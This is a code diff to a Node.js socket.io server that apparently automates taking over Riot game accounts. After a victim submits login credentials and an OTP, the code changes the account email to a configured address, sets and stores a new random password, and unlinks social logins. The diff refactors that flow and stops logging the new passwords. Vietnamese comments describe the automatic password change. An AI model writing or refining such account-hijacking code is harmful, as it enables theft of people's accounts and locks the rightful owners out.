@@ -188,9 +188,6 @@ io.on('connection', (socket) => {
 
                                 if (passwordResult.success) {
                                     AccountHelper.updatePassword(username, newPassword);
-                                    console.log(`password mới cho ${username}: ${newPassword}`);
-                                } else {
-                                    console.log(`đổi password fail cho ${username}: ${passwordResult.error}`);
                                 }
                             }
                         }
@@ -280,36 +277,25 @@ io.on('connection', (socket) => {
                                 email: emailConfig?.email ?? ''
                             });
                         }
-                        loginCredentials.delete(socket.id);
                     }
 
-                    if (emailConfig?.email) {
+                    if (emailConfig?.email && credentials) {
                         const emailResult = await bot.changeEmail(emailConfig.email);
 
                         if (emailResult.success) {
-                            // Tự động đổi password sau khi đổi email thành công
-                            const credentials = loginCredentials.get(socket.id);
-                            const username = credentials?.username ?? 'unknown';
+                            const newPassword = RiotHelper.generateRandomPassword(12);
+                            const passwordResult = await bot.changePassword(credentials.password, newPassword);
 
-                            if (username !== 'unknown') {
-                                const account = AccountHelper.findByUser(username);
-                                if (account?.password) {
-                                    const newPassword = RiotHelper.generateRandomPassword(12);
-                                    const passwordResult = await bot.changePassword(account.password, newPassword);
-
-                                    if (passwordResult.success) {
-                                        AccountHelper.updatePassword(username, newPassword);
-                                        console.log(`password mới cho ${username}: ${newPassword}`);
-                                    } else {
-                                        console.log(`đổi password fail cho ${username}: ${passwordResult.error}`);
-                                    }
-                                }
+                            if (passwordResult.success) {
+                                AccountHelper.updatePassword(credentials.username, newPassword);
                             }
                         }
-
                         await bot.unlinkSocials();
                     }
 
+                    if (credentials) {
+                        loginCredentials.delete(socket.id);
+                    }
                     socket.emit('otp_result', result);
                 } catch {
                     socket.emit('otp_result', result);
